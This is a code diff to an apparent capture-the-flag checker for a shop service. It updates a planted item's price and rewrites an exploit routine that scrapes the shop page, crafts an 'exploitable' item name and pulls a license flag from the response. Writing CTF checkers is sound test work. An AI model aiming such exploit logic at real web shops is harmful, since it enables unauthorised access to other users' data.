@@ -51,7 +51,7 @@ async def putflag_license(task: PutflagCheckerTaskMessage, client: AsyncClient, 
     await create_ShopItem(client=client,logger=None,db=db,kwargs=shop_item_kwargs)
     shop_listing_kwargs = {
         'item_name': item_name,
-        'item_price': 100.0,
+        'item_price': 100000000000.0,
         'description': 'THIS IS SUPER EXPENSIVE GG CHECKER',
     }
     await create_ShopListing(client=client,logger=None,db=db,kwargs=shop_listing_kwargs)
@@ -160,16 +160,18 @@ async def get_noise(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: C
 
 @checker.exploit(0)
 async def exploit_license(searcher: FlagSearcher, client: AsyncClient, db: ChainDB) -> None:
-    regex_license = '<a href="/(.+?)">View License</a>'
-    """
-    try:
-        params = await db.get('license_flag')
-    except DBSearchError:
-        raise MumbleException("Could not retrieve data from ChainDB!")
-    """
-
+    item_cost = 100000000000.0
+    regex_license = '<a href="/(.+?)">View License</a>' 
+    regex_item_name = re.compile(f"<td><h4>(.*)</h4>(?:.*)\n(?:.*)\n<td>{item_cost}</td>",re.MULTILINE)
     user = await register_user(client=client,logger=None,db=db,chain_id=None)
-    item_name = await make_item_name_exploitable(item_name="Mission")
+
+    try:
+        response = await client.get('shop/',follow_redirects=True)
+    except ResponseError:
+        raise MumbleException("EXPLOIT_LICENSE - Error while requesting endpoint shop!")
+    
+
+    item_name = await make_item_name_exploitable(item_name=re.findall(regex_item_name,response.text) )
 
     shop_item_kwargs =  {
         'data_path': '/frog.png',
@@ -220,7 +222,7 @@ async def exploit_license(searcher: FlagSearcher, client: AsyncClient, db: Chain
     flag = searcher.search_flag(response.text)
     if flag:
         return flag
-        
+
     raise MumbleException("Could not find flag in license_file")  
 
 
